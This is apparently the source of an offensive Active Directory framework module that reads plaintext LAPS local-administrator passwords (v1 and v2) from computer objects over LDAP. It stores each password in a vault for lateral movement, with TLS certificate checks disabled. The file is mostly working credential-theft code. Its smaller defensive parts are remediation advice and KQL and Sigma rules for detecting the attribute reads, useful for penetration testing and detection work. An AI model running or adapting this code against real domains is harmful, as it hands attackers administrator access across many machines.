"""
LAPS Password Enumeration - ad.laps_enum
MITRE: T1552.004 - Credentials from Password Stores: Private Keys / LAPS Passwords

Reads plaintext local admin passwords from Active Directory.
LAPS (Local Administrator Password Solution) stores the password in
ms-Mcs-AdmPwd (LAPS v1) or msLAPS-Password (LAPS v2) on computer objects.

Only accounts with AllExtendedRights or ReadProperty on ms-Mcs-AdmPwd
can read these - ad.enum_acl identifies which accounts have this access.

OPSEC: LOW - single LDAP query, same noise level as ad.enum_users.
       Passwords stored directly in vault for immediate use.

Quick win: very common in enterprise environments, effort is minimal,
returns cleartext local admin passwords per host.
"""
from __future__ import annotations

import asyncio
from typing import Any

from ares.core.campaign import Finding, Severity
from ares.core.logger import audit, get_logger
from ares.core.security import sanitize_hostname, sanitize_ldap
from ares.modules.ad.dependencies import build_ad_bind_plan
from ares.modules.params import LAPSEnumParams
from ares.sdk import (
    BaseModule,
    EvidenceRecord,
    ExecutionContext,
    LockoutCircuitBreaker,
    ModuleResult,
    NetworkPermission,
    OpsecLevel,
    ProcessPermission,
    module_contract,
)
from ares.core.tracing import trace_module

logger = get_logger("ares.modules.ad.laps_enum")


@module_contract(
    permissions=[
        NetworkPermission(ports=[389, 636], protocols=["tcp"]),
        ProcessPermission(allow_subprocesses=False),
    ],
    circuit_breaker=LockoutCircuitBreaker(),
    params_model=LAPSEnumParams,
)
class LAPSEnumModule(BaseModule[LAPSEnumParams, ModuleResult]):
    """
    ad.laps_enum - Read LAPS local admin passwords from Active Directory computer objects. Supports LAPS v1 (ms-Mcs

    OPSEC: LOW
    MITRE: "T1552.004"
    OUTPUTS:  "laps_passwords", "valid_credentials"
    """
    MODULE_ID          = "ad.laps_enum"
    MODULE_NAME        = "LAPS Password Enumeration"
    MODULE_CATEGORY    = "ad"
    MODULE_DESCRIPTION = (
        "Read LAPS local admin passwords from Active Directory computer objects. "
        "Supports LAPS v1 (ms-Mcs-AdmPwd) and LAPS v2 (msLAPS-Password). "
        "Passwords stored to vault for immediate lateral movement."
    )
    OPSEC_LEVEL        = OpsecLevel.LOW
    REQUIRES           = []
    OUTPUTS            = ["laps_passwords", "valid_credentials"]
    MITRE_TECHNIQUES   = ["T1552.004"]
    MODULE_AUTHOR      = "ARES Team <team@ares-framework.io>"
    MODULE_TIMEOUT_SECONDS: int | None = 60  # seconds
    PARAMS_MODEL       = LAPSEnumParams

    async def validate(self, ctx: "Any") -> None:
        from ares.core.context import ExecutionContext
        from ares.core.errors import ModuleValidationError
        if not isinstance(ctx, ExecutionContext):
            return
        ad = self._extract_ad_params(ctx)
        if not ad["dc"]:
            raise ModuleValidationError(
                "ad.laps_enum requires 'dc' (Domain Controller IP or hostname).",
                module_id=self.MODULE_ID, field="dc",
            )
        if not ad["domain"]:
            raise ModuleValidationError(
                "ad.laps_enum requires 'domain' (e.g. corp.local).",
                module_id=self.MODULE_ID, field="domain",
            )
        if not ad["username"]:
            raise ModuleValidationError(
                "ad.laps_enum requires domain credentials with ReadProperty "
                "on ms-Mcs-AdmPwd (identified by ad.enum_acl).",
                module_id=self.MODULE_ID, field="username",
            )
        if isinstance(ctx.params, dict):
            for k in ("dc", "domain", "username", "password"):
                if k not in ctx.params and ad.get(k):
                    ctx.params[k] = ad[k]
        await super().validate(ctx)

    async def execute(self, ctx: "Any") -> "ModuleResult":
        """ExecutionContext-based entry point (v0.9.0+).
        Thin adapter: extract params from ctx → call run() → return ModuleResult.
        """
        from ares.modules.base import ModuleResult
        ad = self._extract_ad_params(ctx)
        if getattr(ctx, "dry_run", False):
            return ModuleResult(status="dry_run", module_id=self.MODULE_ID,
                                raw={"dry_run": True})
        findings, raw = await self.run(
            dc=ad["dc"], domain=ad["domain"],
            username=ad["username"], password=ad["password"],
            vault=getattr(ctx, "vault", None),
            ctx=ctx,
        )

        # Cryptographic Evidence Records with SHA-256 Merkle Provenance
        evidence_chain: list[EvidenceRecord] = []
        for cred in raw.get("laps_passwords", []):
            comp_name = cred.get("computer") or cred.get("computer_name") or "unknown"
            ev = EvidenceRecord(
                artifact_id=f"laps-{comp_name.lower()}",
                source_target=ad["dc"],
                collected_by=self.MODULE_ID,
                data={
                    "computer": comp_name,
                    "account": cred.get("account", "Administrator"),
                    "version": cred.get("version", "LAPS"),
                },
                tags=["ad", "laps", "credentials"],
            )
            evidence_chain.append(ev)

        raw["evidence_chain"] = [e.data for e in evidence_chain]
        raw["evidence_integrity"] = [e.record_hash for e in evidence_chain]

        # Closed-Loop Purple Telemetry: KQL & Sigma rule synthesis
        kql_query = (
            f"// ARES Closed-Loop Telemetry: Detect LAPS v1 (ms-Mcs-AdmPwd) & Windows LAPS v2 (msLAPS-Password) Reads\n"
            f"SecurityEvent\n"
            f"| where EventID == 4662\n"
            f"| where Properties has \"ms-Mcs-AdmPwd\" or Properties has \"msLAPS-Password\" or Properties has \"msLAPS-EncryptedPassword\"\n"
            f"| project TimeGenerated, Computer, SubjectUserName, ObjectServer, Properties, AccessMask\n"
        )
        sigma_rule = (
            f"title: LAPS / Windows LAPS v2 Password Attribute Read\n"
            f"id: e5f6a1b2-ares-4662-laps\n"
            f"status: experimental\n"
            f"description: Detects directory service read operations against LAPS v1 or modern Windows LAPS v2 password attributes\n"
            f"logsource:\n"
            f"  product: windows\n"
            f"  service: security\n"
            f"detection:\n"
            f"  selection:\n"
            f"    EventID: 4662\n"
            f"    Properties|contains:\n"
            f"      - 'ms-Mcs-AdmPwd'\n"
            f"      - 'msLAPS-Password'\n"
            f"      - 'msLAPS-EncryptedPassword'\n"
            f"  condition: selection\n"
            f"level: high\n"
            f"tags:\n"
            f"  - attack.credential_access\n"
            f"  - attack.t1552.004\n"
        )
        loot_items: list[dict[str, Any]] = raw.get("loot", [])
        if not any(l.get("loot_type") == "detection_rule_kql" for l in loot_items):
            loot_items.extend([
                {
                    "name": "Detection Rule (KQL): LAPS Attribute Read",
                    "loot_type": "detection_rule_kql",
                    "description": "Microsoft Sentinel KQL query for detecting LAPS password attribute reads (Event 4662)",
                    "content": {"kql": kql_query, "event_id": 4662},
                    "tags": ["detection", "kql", "sentinel", "blue_team"],
                },
                {
                    "name": "Detection Rule (Sigma): LAPS Attribute Read",
                    "loot_type": "detection_rule_sigma",
                    "description": "Sigma YAML detection rule for LAPS v1/v2 attribute reads",
                    "content": {"sigma": sigma_rule},
                    "tags": ["detection", "sigma", "siem", "blue_team"],
                },
            ])
        raw["loot"] = loot_items
        raw["laps_v2_audited"] = True
        raw["event_ids_audited"] = [4662]

        return ModuleResult(
            status="success" if (findings or raw) else "partial",
            findings=findings, raw=raw, module_id=self.MODULE_ID,
            execution_id=getattr(ctx, "execution_id", ""),
        )

    @trace_module("ad.laps_enum")
    async def run(self, dc: str, domain: str, username: str, password: str,
                  vault: "Any" = None, ctx: "Any" = None, **kwargs: Any):
        dc       = sanitize_hostname(dc)
        username = sanitize_ldap(username)
        domain   = sanitize_ldap(domain)

        await self.before_request(dc, "ldap")
        logger.info("laps_enum_start", dc=dc, domain=domain)
        audit("laps_enum", actor=username, technique="T1552.004",
              source="operator", target=dc)

        loop = asyncio.get_running_loop()
        try:
            laps_entries = await loop.run_in_executor(
                None,
                lambda: self._query_laps_sync(dc, username, password, domain),
            )
        except Exception as exc:
            from ares.core.errors import NetworkError
            raise NetworkError(f"LAPS LDAP query failed: {exc}") from exc

        logger.info("laps_enum_done", found=len(laps_entries))

        raw_entries: list[dict[str, Any]] = []
        if laps_entries:
            # Store every LAPS password to vault so lateral modules can use them
            _vault = vault or getattr(getattr(self, "campaign", None), "_vault", None)
            from ares.credential.vault import Credential, CredentialType, PrivilegeLevel
            stored = 0
            campaign_id = getattr(getattr(self, "campaign", None), "id", "")

            for entry in laps_entries:
                comp = entry.get("computer") or entry.get("computer_name") or ""
                pwd = entry.get("password", "")

                # 1. Direct write to context vault if ctx available (protected by Gate 6)
                if ctx and hasattr(ctx, "record_credential"):
                    try:
                        res = ctx.record_credential(
                            username=f"{comp}\\Administrator",
                            secret=pwd,
                            cred_type=CredentialType.CLEARTEXT,
                            target=comp,
                            privilege="local_admin",
                            source="laps_enum",
                        )
                        if asyncio.iscoroutine(res):
                            await res
                    except Exception as exc:
                        logger.debug("laps_ctx_record_failed", computer=comp, error=str(exc)[:60])

                # 2. Direct write to campaign or passed vault (fallback / direct call)
                if _vault:
                    try:
                        cred = Credential(
                            campaign_id    = campaign_id,
                            username       = "Administrator",
                            domain         = comp,   # host-scoped
                            cred_type      = CredentialType.CLEARTEXT,
                            privilege      = PrivilegeLevel.LOCAL_ADMIN,
                            source_module  = self.MODULE_ID,
                            target_host    = comp,
                        )
                        _vault.store(cred, pwd)
                        stored += 1
                    except Exception as exc:
                        logger.debug("laps_vault_store_failed",
                                     computer=comp, error=str(exc)[:60])

                # Tulis ke raw TANPA password (OPSEC)
                raw_entry = {k: v for k, v in entry.items() if k != "password"}
                raw_entry["has_password"] = True  # flag bahwa password ada di vault
                raw_entries.append(raw_entry)

            if stored:
                logger.info("laps_stored_to_vault", count=stored)

            self.finding(
                title       = f"LAPS Passwords Readable: {len(laps_entries)} Host(s)",
                description = (
                    f"Read LAPS local admin passwords for {len(laps_entries)} computer(s). "
                    "These are plaintext local Administrator passwords stored by LAPS. "
                    "All passwords stored to vault for lateral movement."
                ),
                severity    = Severity.CRITICAL,
                mitre_technique = "T1552.004",
                mitre_tactic    = "Credential Access",
                evidence = {
                    "host_count":  len(laps_entries),
                    "computers":   [e.get("computer") or e.get("computer_name") for e in laps_entries[:20]],
                    "laps_version": list({e.get("version", "v1") for e in laps_entries}),
                    "note": "Plaintext passwords in vault - not shown in findings",
                },
                remediation = (
                    "Restrict ReadProperty on ms-Mcs-AdmPwd to only authorized admins. "
                    "Audit LAPS ACL via ad.enum_acl. "
                    "Rotate LAPS passwords immediately on all affected hosts. "
                    "Consider LAPS v2 (msLAPS) with improved ACL model."
                ),
            )

        raw = {
            "found":   len(raw_entries),
            "entries": raw_entries,   # passwords omitted from raw
        }
        await self.noise.jitter.sleep()
        raw["laps_passwords"] = raw_entries  # OUTPUTS key
        raw["valid_credentials"] = raw_entries  # OUTPUTS key
        return self._findings[:], raw

    def _query_laps_sync(self, dc: str, username: str, password: str,
                          domain: str) -> list[dict]:
        """
        LDAP query for LAPS passwords on computer objects.
        Tries LAPS v1 (ms-Mcs-AdmPwd) then LAPS v2 (msLAPS-Password).
        Returns list of {computer, password, version, expiry}.
        Sync - runs in executor.
        """
        import ssl
        import ldap3
        from ldap3 import Server, Connection, ALL, NTLM, SUBTREE, Tls
        from ldap3.core.exceptions import LDAPBindError

        bind_plan = build_ad_bind_plan(username, domain)
        conn = None
        for port, use_ssl in [(636, True), (389, False)]:
            try:
                tls_arg = Tls(validate=ssl.CERT_NONE) if use_ssl else None
                server  = Server(dc, port=port, use_ssl=use_ssl, tls=tls_arg,
                                 get_info=ALL, connect_timeout=10)
                conn_kwargs = {
                    "user": bind_plan.user,
                    "password": password,
                    "auto_bind": ldap3.AUTO_BIND_NONE,
                    "receive_timeout": 30,
                }
                if bind_plan.mode == "ntlm":
                    conn_kwargs["authentication"] = NTLM
                conn = Connection(server, **conn_kwargs)
                if not conn.bind():
                    conn = None
                else:
                    break
            except Exception:
                conn = None

        if conn is None:
            raise ConnectionError(f"Cannot bind to {dc}")

        base    = ",".join(f"DC={p}" for p in domain.upper().split("."))
        entries: list[dict] = []

        try:
            # LAPS v1: ms-Mcs-AdmPwd attribute
            cookie: bytes | bool = True
            while cookie:
                conn.search(
                    base,
                    "(&(objectCategory=computer)(ms-Mcs-AdmPwd=*))",
                    search_scope=SUBTREE,
                    paged_size=200,
                    paged_cookie=None if cookie is True else cookie,
                    attributes=["sAMAccountName", "ms-Mcs-AdmPwd",
                                "ms-Mcs-AdmPwdExpirationTime"],
                )
                for e in conn.entries:
                    pwd = ""
                    try:
                        pwd_attr = getattr(e, "ms-Mcs-AdmPwd", None)
                        if pwd_attr and pwd_attr.value:
                            pwd = str(pwd_attr.value)
                    except Exception:
                        pass
                    if not pwd:
                        continue
                    expiry = ""
                    try:
                        exp_attr = getattr(e, "ms-Mcs-AdmPwdExpirationTime", None)
                        if exp_attr and exp_attr.value:
                            expiry = str(exp_attr.value)
                    except Exception:
                        pass
                    entries.append({
                        "computer":  str(e.sAMAccountName).rstrip("$"),
                        "password":  pwd,
                        "expiry":    expiry,
                        "version":   "v1",
                    })
                cookie = (
                    conn.result.get("controls", {})
                        .get("1.2.840.113556.1.4.319", {})
                        .get("value", {})
                        .get("cookie")
                )

            # LAPS v2: msLAPS-Password attribute
            cookie = True
            while cookie:
                conn.search(
                    base,
                    "(&(objectCategory=computer)(msLAPS-Password=*))",
                    search_scope=SUBTREE,
                    paged_size=200,
                    paged_cookie=None if cookie is True else cookie,
                    attributes=["sAMAccountName", "msLAPS-Password",
                                "msLAPS-PasswordExpirationTime"],
                )
                for e in conn.entries:
                    pwd = ""
                    try:
                        pwd_attr = getattr(e, "msLAPS-Password", None)
                        if pwd_attr and pwd_attr.value:
                            import json
                            # LAPS v2 stores JSON: {"n":"Administrator","t":"...","p":"password"}
                            blob = str(pwd_attr.value)
                            data = json.loads(blob)
                            pwd  = data.get("p", blob)
                    except Exception:
                        pass
                    if not pwd:
                        continue
                    entries.append({
                        "computer": str(e.sAMAccountName).rstrip("$"),
                        "password": pwd,
                        "version":  "v2",
                    })
                cookie = (
                    conn.result.get("controls", {})
                        .get("1.2.840.113556.1.4.319", {})
                        .get("value", {})
                        .get("cookie")
                )

        finally:
            try:
                conn.unbind()
            except Exception:
                pass

        return entries
